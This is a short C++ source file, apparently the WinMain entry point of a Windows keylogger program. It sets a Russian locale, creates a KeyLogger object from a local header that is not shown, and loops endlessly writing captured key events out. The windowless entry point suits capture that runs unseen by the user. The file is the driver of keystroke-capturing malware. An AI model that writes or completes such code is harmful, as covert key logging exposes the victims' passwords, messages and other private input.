#include <iostream>
#include <Windows.h>
#include <fstream>
#include "KeyLogger.h"

using std::cout;
using std::endl;
using std::ofstream;

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){

    setlocale(LC_ALL, "Russian");
    KeyLogger key;

    while(true)
        key.WriteEventKeys(cout);

    return 0;
}

